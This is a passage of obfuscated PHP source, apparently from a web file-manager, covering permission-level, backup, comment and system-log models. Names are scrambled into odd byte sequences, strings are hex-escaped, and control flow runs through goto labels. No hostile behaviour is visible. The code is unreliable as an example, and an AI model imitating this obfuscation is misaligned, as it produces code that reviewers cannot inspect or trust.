self::AUTH_REMOVE); } public static function authCheckShare($cÍ•‚Û‹¦¨) { return self::authCheck($cÍ•‚Û‹¦¨, self::AUTH_SHARE); } public static function authCheckComment($FÈ‘®ç·ôï) { return self::authCheck($FÈ‘®ç·ôï, self::AUTH_COMMENT); } public static function authCheckEvent($Bù¤›Ñì—Ü) { return self::authCheck($Bù¤›Ñì—Ü, self::AUTH_EVENT); } public static function authCheckRoot($f·ˆØŸµğ) { return self::authCheck($f·ˆØŸµğ, self::AUTH_ROOT); } public static function authDisable($B´…ÀõÇÎ, $fƒ¶íŠİõÕ) { if (intval($B´…ÀõÇÎ) <= 0) { return 0; } return intval($B´…ÀõÇÎ) & ~$fƒ¶íŠİõÕ; } public $optionType = "\123\171\x73\164\x65\155\x2e\x73\157\165\162\143\145\101\165\x74\x68\114\151\x73\164"; public $field = array("\x6e\x61\155\145", "\141\x75\164\150", "\154\x61\x62\x65\154", "\x64\151\163\160\154\141\171", "\163\x79\x73\x74\x65\155", "\x73\157\162\164"); public function initData() { $d®ÎÅÎ†‹ = $this->authDefault(); foreach ($d®ÎÅÎ†‹ as $B—™Òô´­­) { $this->add($B—™Òô´­­); } } public function listData($eğÍ¤ŒÆé = false, $fë£Üô’³ = "\163\x6f\x72\164", $E§•é‰Ö±¬ = false) { return parent::listData($eğÍ¤ŒÆé, $fë£Üô’³, $E§•é‰Ö±¬); } public function update($e¢¤ÛáÙ–, $eİ±ËØ×ˆä) { $aô³¬Ÿñ®â =& $_SERVER[Ö]; $CÏ“ñ¶º = parent::listData($e¢¤ÛáÙ–); $fÖµ”‚ß¦® = $this->findByName($eİ±ËØ×ˆä[$aô³¬Ÿñ®â[28]]); if (!$CÏ“ñ¶º || $fÖµ”‚ß¦® && $fÖµ”‚ß¦®[$aô³¬Ÿñ®â[363]] != $CÏ“ñ¶º[$aô³¬Ÿñ®â[363]]) { return !1; } $this->filterAuth($eİ±ËØ×ˆä[$aô³¬Ÿñ®â[372]]); return parent::update($e¢¤ÛáÙ–, $eİ±ËØ×ˆä); } public function remove($EéŸ™»ÙÔ‘) { $bÈ‰ƒìëß½ = parent::listData($EéŸ™»ÙÔ‘); if (!$bÈ‰ƒìëß½ || $bÈ‰ƒìëß½[$_SERVER[Ö][1073]]) { return !1; } return parent::remove($EéŸ™»ÙÔ‘); } public function add($fáé …·…¨ = array()) { goto FõÕ§õôò´; FÖºÊ¹ÔÑ : $fáé …·…¨ = array_merge($aÓä«Íõó®, $fáé …·…¨); $fáé …·…¨[$bš™ÀÆ‘Ÿ©[2098]] = $this->getSort(); $this->filterAuth($fáé …·…¨[$bš™ÀÆ‘Ÿ©[372]]); goto CÉİ¥½½Öİ; CÉİ¥½½Öİ: return parent::insert($fáé …·…¨); goto C‡Ò™‚Áš; FõÕ§õôò´: $bš™ÀÆ‘Ÿ© =& $_SERVER[Ö]; if ($this->findByName($fáé …·…¨[$bš™ÀÆ‘Ÿ©[28]])) { return !1; } $aÓä«Íõó® = array($bš™ÀÆ‘Ÿ©[28] => $bš™ÀÆ‘Ÿ©[33], $bš™ÀÆ‘Ÿ©[372] => 1, $bš™ÀÆ‘Ÿ©[2095] => $bš™ÀÆ‘Ÿ©[2096], $bš™ÀÆ‘Ÿ©[2097] => 1, $bš™ÀÆ‘Ÿ©[1073] => 0, $bš™ÀÆ‘Ÿ©[2098] => 0); goto FÖºÊ¹ÔÑ ; C‡Ò™‚Áš: } private function getSort() { $C©Ò•Ö°«ö =& $_SERVER[Ö]; $BóÒòÆšèÇ = parent::listData(); $c˜Ú—‘ğœ = array_to_keyvalue($BóÒòÆšèÇ, $C©Ò•Ö°«ö[33], $C©Ò•Ö°«ö[2098]); return empty($c˜Ú—‘ğœ) ? 0 : max($c˜Ú—‘ğœ) + 1; } private function filterAuth(&$A”‰×·îÓ«) { goto b‹Ã‘–ó†°; b‹Ã‘–ó†°: if (!$A”‰×·îÓ«) { return; } $CÚ…¿›¥õ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $d‰æçë²¦“ = array(); goto bñè†ğİ¼; aÕÎ¦Õî: foreach ($d‰æçë²¦“ as $E’éõÌ¬†Ä) { if (isset($böÚñ¬Ò“[$E’éõÌ¬†Ä])) { $d‰æçë²¦“ = array_merge($d‰æçë²¦“, $böÚñ¬Ò“[$E’éõÌ¬†Ä]); } } $d‰æçë²¦“[] = self::AUTH_SHOW; $A”‰×·îÓ« = array_sum(array_unique($d‰æçë²¦“)); goto F·Ï¢†éêÏ; bñè†ğİ¼: foreach ($CÚ…¿›¥õ as $E’éõÌ¬†Ä) { if ($A”‰×·îÓ« & $E’éõÌ¬†Ä) { $d‰æçë²¦“[] = $E’éõÌ¬†Ä; } } if (in_array(self::AUTH_ROOT, $d‰æçë²¦“)) { $A”‰×·îÓ« = array_sum($CÚ…¿›¥õ); return; } $böÚñ¬Ò“ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto aÕÎ¦Õî; F·Ï¢†éêÏ: } public function sort($b‹¡Œù”Ğ•, $B—‘˜¦í‹) { return parent::update($b‹¡Œù”Ğ•, $B—‘˜¦í‹); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\142\141\143\153\x75\160\114\151\163\164"; public $field = array("\x69\157", "\156\141\155\145", "\x73\164\141\x74\165\163", "\143\157\x6e\164\145\x6e\x74", "\162\145\163\x75\x6c\164", "\164\x69\155\x65\106\162\157\x6d", "\x74\x69\x6d\145\x54\x6f"); public function config() { goto E…êéØÊà´; eÁ˜¿Ò´Ùß: if (isset($bŸ„Ô—¯†õ[$A’ñ¥•ğñİ[186]])) { $bŸ„Ô—¯†õ[$A’ñ¥•ğñİ[186]] = json_decode($bŸ„Ô—¯†õ[$A’ñ¥•ğñİ[186]], !0); } if (isset($FÉ¤ã¤•[$A’ñ¥•ğñİ[186]])) { $bŸ„Ô—¯†õ[$A’ñ¥•ğñİ[186]][$A’ñ¥•ğñİ[1389]] = $FÉ¤ã¤•[$A’ñ¥•ğñİ[186]]; unset($FÉ¤ã¤•[$A’ñ¥•ğñİ[186]]); } return array_merge($bŸ„Ô—¯†õ, $FÉ¤ã¤•); goto c®—…Óƒí; AÄƒ¦ó³Üó: Action($A’ñ¥•ğñİ[2099])->taskInit(); $E«¬áùÅã´ = Model($A’ñ¥•ğñİ[2100])->listData(); foreach ($E«¬áùÅã´ as $cìáğ¶ñ«î) { if ($cìáğ¶ñ«î[$A’ñ¥•ğñİ[1073]] == $A’ñ¥•ğñİ[83] && $cìáğ¶ñ«î[$A’ñ¥•ğñİ[1402]] == $A’ñ¥•ğñİ[2101]) { $bŸ„Ô—¯†õ = $cìáğ¶ñ«î; break; } } goto eÁ˜¿Ò´Ùß; dÎ²àÈÕÉ: $FÉ¤ã¤• = is_array($FÉ¤ã¤•) ? $FÉ¤ã¤• : array(); if (!isset($FÉ¤ã¤•[$A’ñ¥•ğñİ[685]])) { $FÉ¤ã¤•[$A’ñ¥•ğñİ[685]] = $A’ñ¥•ğñİ[464]; } $bŸ„Ô—¯†õ = array(); goto AÄƒ¦ó³Üó; E…êéØÊà´: $A’ñ¥•ğñİ =& $_SERVER[Ö]; $FÉ¤ã¤• = Model($A’ñ¥•ğñİ[1081])->get($A’ñ¥•ğñİ[705]); $FÉ¤ã¤• = json_decode($FÉ¤ã¤•, !0); goto dÎ²àÈÕÉ; c®—…Óƒí: } public function listData($AŒ¿ãá°¡Ô = false, $dƒª‹¨æÄô = "\155\157\144\x69\146\x79\x54\151\155\145", $d«çË—µ› = false) { return parent::listData($AŒ¿ãá°¡Ô, $dƒª‹¨æÄô, !0); } public function lastItem() { $Eª·³àù÷‹ = $this->listData(); return !empty($Eª·³àù÷‹[0]) ? $Eª·³àù÷‹[0] : null; } public function kill($Fí†¾¸÷™) { goto D¬æ˜ç§ß; C–¿È»¨¸¦: Task::kill($EáŞ¡–¦•Ó[704]); Task::kill($EáŞ¡–¦•Ó[722]); Task::kill($EáŞ¡–¦•Ó[729]); goto aî›×”ÚÀ¨; aî›×”ÚÀ¨: $eìÃ¥ñÄ = $dĞÉ³³ ğ[$EáŞ¡–¦•Ó[28]]; $F°ƒÂ”õ = TEMP_FILES . $EáŞ¡–¦•Ó[703] . $eìÃ¥ñÄ . $EáŞ¡–¦•Ó[8]; IO::remove($F°ƒÂ”õ, !1); goto fŒÁÊÀ£²è; fŒÁÊÀ£²è: return $this->remove($Fí†¾¸÷™); goto d›õì£÷Œ¡; D¬æ˜ç§ß: $EáŞ¡–¦•Ó =& $_SERVER[Ö]; $dĞÉ³³ ğ = $this->listData($Fí†¾¸÷™); if (!$dĞÉ³³ ğ || empty($dĞÉ³³ ğ[$EáŞ¡–¦•Ó[28]])) { return !0; } goto C–¿È»¨¸¦; d›õì£÷Œ¡: } public function remove($fĞ²³ÂõÄŸ) { $Eë·Œ¡ğ…» = $this->listData($fĞ²³ÂõÄŸ); if (!$Eë·Œ¡ğ…») { return !0; } return $this->backupRemove($Eë·Œ¡ğ…»); } private function backupRemove($B‹½‡°¨œ) { $f§İš³‡Ú„ =& $_SERVER[Ö]; parent::remove($B‹½‡°¨œ[$f§İš³‡Ú„[363]]); $b¬Î”¼Œ¯† = "\x7b\x69\x6f\x3a{$B‹½‡°¨œ[$f§İš³‡Ú„[684]]}\x7d\57\x64\141\x74\141\142\x61\163\145\x2f\142\141\143\x6b\x75\160\137" . $B‹½‡°¨œ[$f§İš³‡Ú„[28]]; IO::remove($b¬Î”¼Œ¯†, !1); return !0; } public function start() { goto AÛ Ì·Á; C‡Â×Ó´è…: if (!$cÑ’‹íìæá || $cÑ’‹íìæá[$aô×–¡”‰[1386]] != $aô×–¡”‰[83]) { return !1; } $bíÌ¹ˆÌÛÎ = $this->process(); foreach ($bíÌ¹ˆÌÛÎ as $aâÓéØİ•Û) { if ($aâÓéØİ•Û) { return Task::restart($aâÓéØİ•Û[$aô×–¡”‰[363]]); } } goto bíô¸ˆÙ; FÎè•‡ÂÀ¥: if (!$c­øÄ½ñáÀ->dbFile()) { return !1; } if ($cÑ’‹íìæá[$aô×–¡”‰[685]] == $aô×–¡”‰[464]) { $c­øÄ½ñáÀ->file(); } Backup::set(array($aô×–¡”‰[682] => 1, $aô×–¡”‰[696] => time())); goto e… »Ø¾‘¥; e… »Ø¾‘¥: return !0; goto c¨ªÊÉ’—å; bíô¸ˆÙ: $c­øÄ½ñáÀ = new Backup(); $c­øÄ½ñáÀ->keep(); if (!$c­øÄ½ñáÀ->db()) { return !1; } goto FÎè•‡ÂÀ¥; AÛ Ì·Á: $aô×–¡”‰ =& $_SERVER[Ö]; if ($GLOBALS[$aô×–¡”‰[6]][$aô×–¡”‰[84]][$aô×–¡”‰[2102]] != $aô×–¡”‰[83]) { return !0; } $cÑ’‹íìæá = $this->config(); goto C‡Â×Ó´è…; c¨ªÊÉ’—å: } public function process() { $C©ğ×ğÁÛÆ =& $_SERVER[Ö]; return array($C©ğ×ğÁÛÆ[687] => Task::get($C©ğ×ğÁÛÆ[704]), $C©ğ×ğÁÛÆ[690] => Task::get($C©ğ×ğÁÛÆ[722]), $C©ğ×ğÁÛÆ[163] => Task::get($C©ğ×ğÁÛÆ[729])); } public function restore() { $fˆŠô‚˜“  =& $_SERVER[Ö]; ActionCall($fˆŠô‚˜“ [2103], !0, 1); ActionCall($fˆŠô‚˜“ [2103], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\156\x74"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\x6d\x65" => "\x63\157\155\155\145\x6e\164\137\155\x65\164\141", "\x6d\145\164\x61\x46\x69\145\154\144" => "\143\x6f\155\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($C ¾Ş¢ÎĞ) { $bº¶ïØ±† =& $_SERVER[Ö]; if ($C ¾Ş¢ÎĞ[$bº¶ïØ±†[2104]]) { $D ç‹Âß‚ˆ = $this->where(array($bº¶ïØ±†[2105] => $C ¾Ş¢ÎĞ[$bº¶ïØ±†[2104]]))->find(); if (!$D ç‹Âß‚ˆ || $D ç‹Âß‚ˆ[$bº¶ïØ±†[367]] != $C ¾Ş¢ÎĞ[$bº¶ïØ±†[367]] || $D ç‹Âß‚ˆ[$bº¶ïØ±†[452]] != $C ¾Ş¢ÎĞ[$bº¶ïØ±†[452]]) { return !1; } $this->where(array($bº¶ïØ±†[2105] => $C ¾Ş¢ÎĞ[$bº¶ïØ±†[2104]]))->setAdd($bº¶ïØ±†[2106], 1); } return $this->add($C ¾Ş¢ÎĞ); } public function remove($fº¼óÆ§ì´) { $f³ä›¬ˆÌ =& $_SERVER[Ö]; $Bí™…óŞÊ˜ = array($f³ä›¬ˆÌ[2105] => $fº¼óÆ§ì´); $f‡æé­¦¦ = $this->where($Bí™…óŞÊ˜)->find(); if ($f‡æé­¦¦[$f³ä›¬ˆÌ[2104]]) { $this->where(array($f³ä›¬ˆÌ[2105] => $f‡æé­¦¦[$f³ä›¬ˆÌ[2104]]))->setAdd($f³ä›¬ˆÌ[2106], -1); } return $this->where($Bí™…óŞÊ˜)->delete(); } public function edit($f”›©ô›¥, $DÍÀÚËæá) { $cÂê›õ“°‰ =& $_SERVER[Ö]; $eÙ†“¸İô = array($cÂê›õ“°‰[2105] => $f”›©ô›¥); return $this->where($eÙ†“¸İô)->save(array($cÂê›õ“°‰[2107] => $DÍÀÚËæá)); } public function prasise($Aß…Ùäí½) { $A§£™¦Æ¬ø =& $_SERVER[Ö]; $aÄÔÂ½ŞÛ… = Model($A§£™¦Æ¬ø[2108]); $b¿‡™å–‰Æ = array($A§£™¦Æ¬ø[2105] => $Aß…Ùäí½, $A§£™¦Æ¬ø[1405] => USER_ID); $Eî™ñäÔˆ® = $aÄÔÂ½ŞÛ…->where($b¿‡™å–‰Æ)->find(); if (!$Eî™ñäÔˆ®) { $aÄÔÂ½ŞÛ…->add($b¿‡™å–‰Æ); $b——»ò¥ùö = $this->where(array($A§£™¦Æ¬ø[2105] => $Aß…Ùäí½))->setAdd($A§£™¦Æ¬ø[2109], 1); } else { $aÄÔÂ½ŞÛ…->where($b¿‡™å–‰Æ)->delete(); $b——»ò¥ùö = $this->where(array($A§£™¦Æ¬ø[2105] => $Aß…Ùäí½))->setAdd($A§£™¦Æ¬ø[2109], -1); } return $b——»ò¥ùö; } public function targetInfo($BÈ××ìê¸ó, $DÛš£ºËÓÛ) { goto D‘‰ÅÒ”»; AÀ­‰„Áè…: $AˆİœÖ©ØÒ = "\122\111\x47\110\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\156\164\x5f\x70\162\x61\x69\x73\145\40\x73\164\141\162\40\157\x6e\40\143\157\155\x6d\145\156\x74\x2e\143\x6f\x6d\155\145\x6e\164\x49\104\40\75\x20\x73\x74\x61\x72\x2e\143\157\155\155\x65\x6e\164\x49\x44"; $b„Ûõìè… = $this->alias($Dæ‰ä’‰ìå[337])->where($bßá‘æàÖ¸)->join($AˆİœÖ©ØÒ, $Dæ‰ä’‰ìå[2110])->count(); $F¿ †º»ã = array($Dæ‰ä’‰ìå[2111] => $Aˆ†ª•³÷©, $Dæ‰ä’‰ìå[2112] => $b„Ûõìè…); goto cÄßœÃ¥§Ò; D‘‰ÅÒ”»: $Dæ‰ä’‰ìå =& $_SERVER[Ö]; $bßá‘æàÖ¸ = array($Dæ‰ä’‰ìå[517] => $BÈ××ìê¸ó, $Dæ‰ä’‰ìå[518] => $DÛš£ºËÓÛ); $Aˆ†ª•³÷© = $this->where($bßá‘æàÖ¸)->count(); goto AÀ­‰„Áè…; cÄßœÃ¥§Ò: return $F¿ †º»ã; goto D“Œ–¾†ù; D“Œ–¾†ù: } public function listData($Eòº¡É¢½Ñ) { $AºÀÌí×ÃØ =& $_SERVER[Ö]; if (isset($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2113]])) { if ($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2113]]) { $Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2114]] = array($AºÀÌí×ÃØ[923], intval($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2113]])); } unset($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2113]]); } if (isset($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2115]])) { if ($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2115]]) { $Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2114]] = array($AºÀÌí×ÃØ[920], intval($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2115]])); } unset($Eòº¡É¢½Ñ[$AºÀÌí×ÃØ[2115]]); } return $this->_listData($Eòº¡É¢½Ñ); } private function _listData($DÍÚ¾´‡Ëó) { $dÅ«´ÏÃ =& $_SERVER[Ö]; $dÍ‹Ó ¹¦“ = $this->where($DÍÚ¾´‡Ëó)->_makeOrder()->selectPage(100); $this->_listAppendParent($dÍ‹Ó ¹¦“[$dÅ«´ÏÃ[350]]); $this->_listAppendUser($dÍ‹Ó ¹¦“[$dÅ«´ÏÃ[350]]); $this->_listAppendMeta($dÍ‹Ó ¹¦“[$dÅ«´ÏÃ[350]]); return $dÍ‹Ó ¹¦“; } private function _makeOrder() { $fçñ·¿‡Ìƒ =& $_SERVER[Ö]; $fÕÃ‹¶™·ˆ = array($fçñ·¿‡Ìƒ[2109], $fçñ·¿‡Ìƒ[2106], $fçñ·¿‡Ìƒ[183]); $E÷ìË— ƒÔ = Input::get($fçñ·¿‡Ìƒ[403], $fçñ·¿‡Ìƒ[7], $fçñ·¿‡Ìƒ[385], $fÕÃ‹¶™·ˆ); $bğ—¤¿™® = Input::get($fçñ·¿‡Ìƒ[404], $fçñ·¿‡Ìƒ[7], $fçñ·¿‡Ìƒ[1407], array($fçñ·¿‡Ìƒ[2116], $fçñ·¿‡Ìƒ[401])); $BŒ¦¢ÇğÕ = $E÷ìË— ƒÔ . $fçñ·¿‡Ìƒ[50] . $bğ—¤¿™®; return $this->order($BŒ¦¢ÇğÕ); } private function _listAppendParent(&$E£Êñ²ùÕ¯) { goto AÛÅ¶²ËŠ; AÛÅ¶²ËŠ: $F˜Ô­ÌÓ¨ =& $_SERVER[Ö]; $Fê†ÊÓõ‡Ç = array_unique(array_to_keyvalue($E£Êñ²ùÕ¯, $F˜Ô­ÌÓ¨[33], $F˜Ô­ÌÓ¨[2104])); $Fê†ÊÓõ‡Ç = array_remove_value($Fê†ÊÓõ‡Ç, $F˜Ô­ÌÓ¨[464]); goto a×Œ÷×ÆñÓ; a×Œ÷×ÆñÓ: if (!$Fê†ÊÓõ‡Ç) { return; } $c¢õÈÛƒÆ¡ = $this->where(array($F˜Ô­ÌÓ¨[2105] => array($F˜Ô­ÌÓ¨[7], $Fê†ÊÓõ‡Ç)))->select(); $c¢õÈÛƒÆ¡ = array_to_keyvalue($c¢õÈÛƒÆ¡, $F˜Ô­ÌÓ¨[2114]); goto a¸ºô«µ‰ñ; a¸ºô«µ‰ñ: foreach ($E£Êñ²ùÕ¯ as &$aÄ¡âœÈŒ) { if (isset($c¢õÈÛƒÆ¡[$aÄ¡âœÈŒ[$F˜Ô­ÌÓ¨[2104]]])) { $aÄ¡âœÈŒ[$F˜Ô­ÌÓ¨[2117]] = $c¢õÈÛƒÆ¡[$aÄ¡âœÈŒ[$F˜Ô­ÌÓ¨[2104]]]; } } goto EœÉæß¸¯ ; EœÉæß¸¯ : } private function _listAppendUser(&$eöÀ—‰Û´) { goto AŞÓ¤Ç‡ï”; aã»ğÑÜÀİ: foreach ($eöÀ—‰Û´ as &$B¥÷»§¥è) { $B¥÷»§¥è[$d³¢ï¬œ[531]] = $a…È¨…ÈöÏ[$B¥÷»§¥è[$d³¢ï¬œ[1414]]]; if (isset($B¥÷»§¥è[$d³¢ï¬œ[2117]])) { $B¥÷»§¥è[$d³¢ï¬œ[2117]][$d³¢ï¬œ[531]] = $a…È¨…ÈöÏ[$B¥÷»§¥è[$d³¢ï¬œ[2117]][$d³¢ï¬œ[1414]]]; } } goto Eà“¬ÆêÒ; AŞÓ¤Ç‡ï”: $d³¢ï¬œ =& $_SERVER[Ö]; $C¥È†ğ¤¥í = array_unique(array_to_keyvalue($eöÀ—‰Û´, $d³¢ï¬œ[33], $d³¢ï¬œ[1414])); $C¥È†ğ¤¥í = array_remove_value($C¥È†ğ¤¥í, $d³¢ï¬œ[464]); goto cÁ¿¤§‡ä; cÁ¿¤§‡ä: if (count($C¥È†ğ¤¥í) == 0) { return; } foreach ($eöÀ—‰Û´ as $B¥÷»§¥è) { if (isset($B¥÷»§¥è[$d³¢ï¬œ[2117]])) { $C¥È†ğ¤¥í[] = $B¥÷»§¥è[$d³¢ï¬œ[2117]][$d³¢ï¬œ[1414]]; } } $a…È¨…ÈöÏ = Model($d³¢ï¬œ[473])->userListInfo($C¥È†ğ¤¥í); goto aã»ğÑÜÀİ; Eà“¬ÆêÒ: } private function _listAppendMeta(&$cğâìÅ«‚) { goto FÃ¸­¯”; bàŞ£·å’: if (!$FÃßÃâ) { return; } foreach ($cğâìÅ«‚ as $f‹î´¤‹¡¼) { if (isset($f‹î´¤‹¡¼[$c“ô­‰»í[2117]])) { $FÃßÃâ[] = $f‹î´¤‹¡¼[$c“ô­‰»í[2117]][$c“ô­‰»í[2114]]; } } $c‚¸÷¼ÖØè = $this->metaList($FÃßÃâ); goto a–ŒÄê®˜; FÃ¸­¯”: $c“ô­‰»í =& $_SERVER[Ö]; $FÃßÃâ = array_unique(array_to_keyvalue($cğâìÅ«‚, $c“ô­‰»í[33], $c“ô­‰»í[2114])); $FÃßÃâ = array_remove_value($FÃßÃâ, $c“ô­‰»í[464]); goto bàŞ£·å’; a–ŒÄê®˜: if (!$c‚¸÷¼ÖØè) { return !1; } foreach ($cğâìÅ«‚ as &$f‹î´¤‹¡¼) { $f‹î´¤‹¡¼[$c“ô­‰»í[413]] = $c‚¸÷¼ÖØè[$f‹î´¤‹¡¼[$c“ô­‰»í[2114]]]; if (isset($f‹î´¤‹¡¼[$c“ô­‰»í[2117]])) { $f‹î´¤‹¡¼[$c“ô­‰»í[2117]][$c“ô­‰»í[413]] = $c‚¸÷¼ÖØè[$f‹î´¤‹¡¼[$c“ô­‰»í[2117]][$c“ô­‰»í[2114]]]; } } goto D¢ÙèÌ®É; D¢ÙèÌ®É: } private function metaList($FİºÉÌ÷ˆˆ) { goto Aªøïé‰; BåÃ¬ŞŞÜš: return $CÍˆ»¨Ãµ» ? $CÍˆ»¨Ãµ» : array(); goto BÃçÒùÙ›Š; B•Çåèë‘: $CÍˆ»¨Ãµ» = Model($c›É›Ç¬¢¾[2118])->where($BĞ£İò£ì)->select(); $CÍˆ»¨Ãµ» = array_to_keyvalue_group($CÍˆ»¨Ãµ», $c›É›Ç¬¢¾[2114]); foreach ($CÍˆ»¨Ãµ» as $fàáÕø›ˆÇ => $fÛ˜Æ…×) { $dŸÄ†¤‘½î = array(); foreach ($fÛ˜Æ…× as $bößÖèÎİ‘) { $dŸÄ†¤‘½î[$bößÖèÎİ‘[$c›É›Ç¬¢¾[89]]] = $bößÖèÎİ‘[$c›É›Ç¬¢¾[355]]; } $CÍˆ»¨Ãµ»[$fàáÕø›ˆÇ] = $dŸÄ†¤‘½î; } goto BåÃ¬ŞŞÜš; Aªøïé‰: $c›É›Ç¬¢¾ =& $_SERVER[Ö]; if (!$FİºÉÌ÷ˆˆ) { return array(); } $BĞ£İò£ì = array($c›É›Ç¬¢¾[2114] => array($c›É›Ç¬¢¾[7], $FİºÉÌ÷ˆˆ)); goto B•Çåèë‘; BÃçÒùÙ›Š: } } goto bïáŸĞƒŒ¤; Eì‘‰ôÒÔ…: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\x2e\x4c\x69\x67\150\x74\101\160\x70"; public $modelType = "\123\171\163\x74\145\x6d\x4f\x70\x74\151\157\156"; public $field = array("\x6e\141\155\x65", "\x67\x72\x6f\165\160", "\144\145\163\143", "\143\157\156\164\x65\156\164"); public function listData($EçŒŸ¼Ù‡ = false, $F…Ã£è‡¯ = "\x6d\x6f\144\x69\146\x79\x54\x69\155\x65", $Bİˆ‘ÈÊ­Ú = true) { return parent::listData($EçŒŸ¼Ù‡, $F…Ã£è‡¯, $Bİˆ‘ÈÊ­Ú); } public function remove($C°ßõùˆ§) { $CŞ¨êÇ¢Òƒ = $this->findByName($C°ßõùˆ§); if (!$CŞ¨êÇ¢Òƒ) { return !1; } return parent::remove($CŞ¨êÇ¢Òƒ[$_SERVER[Ö][363]]); } public function add($fÛÃ¥†­—‹) { if ($this->findByName($fÛÃ¥†­—‹[$_SERVER[Ö][28]])) { return !1; } return parent::insert($fÛÃ¥†­—‹); } public function update($eì’œŠ¡‰ç, $dñ¶Ğ£ÏÖ) { $B‰±Ìßë =& $_SERVER[Ö]; $f·š†¯º¥İ = $this->findByName($eì’œŠ¡‰ç); $dÁ¨Ä’Ø®Ã = $this->findByName($dñ¶Ğ£ÏÖ[$B‰±Ìßë[28]]); if (!$f·š†¯º¥İ || $dÁ¨Ä’Ø®Ã && $dÁ¨Ä’Ø®Ã[$B‰±Ìßë[363]] != $f·š†¯º¥İ[$B‰±Ìßë[363]]) { return !1; } return parent::update($f·š†¯º¥İ[$B‰±Ìßë[363]], $dñ¶Ğ£ÏÖ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\x69\x6d\145", "\164\x69\x6d\145", "\151\x6e\163\x65\162\x74", "\146\165\156\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $fÇ¡›íåùñ =& $_SERVER[Ö]; return array($fÇ¡›íåùñ[2349] => LNG($fÇ¡›íåùñ[2350]), $fÇ¡›íåùñ[2351] => LNG($fÇ¡›íåùñ[2352]), $fÇ¡›íåùñ[2017] => LNG($fÇ¡›íåùñ[2353]), $fÇ¡›íåùñ[2354] => LNG($fÇ¡›íåùñ[2355]), $fÇ¡›íåùñ[2356] => LNG($fÇ¡›íåùñ[2357]), $fÇ¡›íåùñ[2358] => LNG($fÇ¡›íåùñ[2359]), $fÇ¡›íåùñ[2360] => LNG($fÇ¡›íåùñ[2361]), $fÇ¡›íåùñ[2362] => LNG($fÇ¡›íåùñ[2363]), $fÇ¡›íåùñ[2048] => LNG($fÇ¡›íåùñ[2364]), $fÇ¡›íåùñ[2049] => LNG($fÇ¡›íåùñ[2365]), $fÇ¡›íåùñ[2366] => LNG($fÇ¡›íåùñ[2367]), $fÇ¡›íåùñ[2368] => LNG($fÇ¡›íåùñ[2369]), $fÇ¡›íåùñ[2370] => LNG($fÇ¡›íåùñ[2371]), $fÇ¡›íåùñ[2372] => LNG($fÇ¡›íåùñ[2373]), $fÇ¡›íåùñ[2046] => LNG($fÇ¡›íåùñ[2374]), $fÇ¡›íåùñ[2052] => LNG($fÇ¡›íåùñ[2375]), $fÇ¡›íåùñ[2376] => LNG($fÇ¡›íåùñ[2377]), $fÇ¡›íåùñ[2378] => LNG($fÇ¡›íåùñ[2379]), $fÇ¡›íåùñ[2380] => LNG($fÇ¡›íåùñ[2381]), $fÇ¡›íåùñ[2382] => LNG($fÇ¡›íåùñ[2383]), $fÇ¡›íåùñ[2055] => LNG($fÇ¡›íåùñ[2384]), $fÇ¡›íåùñ[2056] => LNG($fÇ¡›íåùñ[2385]), $fÇ¡›íåùñ[2386] => LNG($fÇ¡›íåùñ[2387]), $fÇ¡›íåùñ[2388] => LNG($fÇ¡›íåùñ[2389]), $fÇ¡›íåùñ[2390] => LNG($fÇ¡›íåùñ[2391]), $fÇ¡›íåùñ[2392] => LNG($fÇ¡›íåùñ[2393]), $fÇ¡›íåùñ[2394] => LNG($fÇ¡›íåùñ[2395]), $fÇ¡›íåùñ[2050] => LNG($fÇ¡›íåùñ[2396]), $fÇ¡›íåùñ[2397] => LNG($fÇ¡›íåùñ[2398]), $fÇ¡›íåùñ[2399] => LNG($fÇ¡›íåùñ[2400]), $fÇ¡›íåùñ[2401] => LNG($fÇ¡›íåùñ[2401]), $fÇ¡›íåùñ[2402] => LNG($fÇ¡›íåùñ[2021]), $fÇ¡›íåùñ[2403] => LNG($fÇ¡›íåùñ[2404]), $fÇ¡›íåùñ[2405] => LNG($fÇ¡›íåùñ[2406]), $fÇ¡›íåùñ[2407] => LNG($fÇ¡›íåùñ[2408]), $fÇ¡›íåùñ[2409] => LNG($fÇ¡›íåùñ[2410]), $fÇ¡›íåùñ[2411] => LNG($fÇ¡›íåùñ[2412]), $fÇ¡›íåùñ[2413] => LNG($fÇ¡›íåùñ[2413]), $fÇ¡›íåùñ[2414] => LNG($fÇ¡›íåùñ[2415]), $fÇ¡›íåùñ[2416] => LNG($fÇ¡›íåùñ[2417]), $fÇ¡›íåùñ[2418] => LNG($fÇ¡›íåùñ[2419]), $fÇ¡›íåùñ[2420] => 